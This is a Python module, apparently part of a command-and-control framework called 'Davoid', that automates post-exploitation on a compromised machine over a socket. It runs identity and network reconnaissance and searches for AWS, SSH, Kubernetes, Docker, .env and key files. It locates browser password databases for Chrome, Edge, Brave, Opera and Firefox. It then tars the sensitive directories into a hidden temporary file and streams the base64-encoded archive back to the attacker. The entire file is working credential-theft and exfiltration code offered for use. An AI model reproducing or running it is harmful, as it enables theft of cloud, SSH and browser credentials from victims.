# --- Module Context: LOOTER (Post-Exploitation) ---
# Project: Davoid C2 Framework
# Purpose: Advanced Automated Data Harvesting & Exfiltration
# --------------------------------------------------

import time
import os
import base64


def auto_recon(sock):
    """Gathers comprehensive system, network, and identity intelligence."""
    try:
        # Combined command for speed and reduced footprint
        recon_cmd = (
            "echo '---IDENTITY---' && whoami && hostname && id && "
            "echo '---SYSTEM---' && uname -a && uptime && "
            "echo '---NETWORK---' && (ip addr || ifconfig) && netstat -antp 2>/dev/null | grep ESTABLISHED\n"
        )
        sock.send(recon_cmd.encode())
        time.sleep(1)
        raw_info = sock.recv(4096).decode().strip()

        # Target high-value cloud and dev environments
        secret_search = (
            "find ~ -maxdepth 3 -type d \( -name '.aws' -o -name '.docker' -o -name '.kube' -o -name '.ssh' -o -name '.gcloud' \) 2>/dev/null && "
            "find . -maxdepth 4 -name '.env' -o -name 'config.json' -o -name '*.pem' -o -name '*.key' 2>/dev/null\n"
        )
        sock.send(secret_search.encode())
        time.sleep(1)
        secrets = sock.recv(4096).decode().strip().replace('\n', ', ')

        return {
            'recon_data': raw_info,
            'discovered_secrets': secrets if secrets else "None"
        }
    except Exception as e:
        return {'error': str(e)}


def harvest_credentials(sock):
    """Targets broad browser databases and session tokens for exfiltration."""
    results = []

    # Expanded targets: Chrome, Edge, Brave, Opera, Vivaldi, Firefox
    paths = [
        # Linux Paths
        "~/.config/google-chrome/Default/Login\\ Data",
        "~/.config/microsoft-edge/Default/Login\\ Data",
        "~/.config/BraveSoftware/Brave-Browser/Default/Login\\ Data",
        "~/.config/opera/Login\\ Data",
        "~/.mozilla/firefox/*.default-release/logins.json",
        # macOS Paths
        "~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data",
        "~/Library/Application\\ Support/Microsoft\\ Edge/Default/Login\\ Data",
        "~/Library/Application\\ Support/BraveSoftware/Brave-Browser/Default/Login\\ Data",
        "~/Library/Application\\ Support/Firefox/Profiles/*.default-release/logins.json"
    ]

    for p in paths:
        cmd = f"ls {p} 2>/dev/null\n"
        sock.send(cmd.encode())
        found = sock.recv(1024).decode().strip()
        if found:
            results.append(found)

    return f"Loot Found: {', '.join(results)}" if results else "No DBs found"


def deep_loot_exfil(sock):
    """Packages and exfiltrates discovered keys and config files."""
    # This command creates a hidden tarball of the most sensitive directories
    # and prepares it for transmission via base64 to avoid binary corruption.
    exfil_cmd = (
        "tar -czf /tmp/.data_cache.tgz ~/.ssh ~/.aws ~/.docker ~/.kube "
        "$(find . -name '.env' -o -name 'config.json') 2>/dev/null && "
        "base64 /tmp/.data_cache.tgz && rm /tmp/.data_cache.tgz\n"
    )
    try:
        sock.send(exfil_cmd.encode())
        # Large buffer for the base64 data
        data = b""
        while True:
            chunk = sock.recv(8192)
            data += chunk
            if len(chunk) < 8192:
                break
        return data.decode().strip()
    except:
        return "Exfil Failed"


def run_looter(sock):
    """Main execution entry point for the Davoid Ghost callback."""
    print("[+] Ghost Callback Received. Initiating LOOTER...")

    intel = auto_recon(sock)
    creds = harvest_credentials(sock)

    # If high-value targets found, trigger deep exfiltration
    if "Found" in creds or intel.get('discovered_secrets') != "None":
        loot_data = deep_loot_exfil(sock)
        return {"status": "Complete", "intel": intel, "creds": creds, "exfil": "Payload Sent"}

    return {"status": "Recon Only", "intel": intel, "creds": creds}
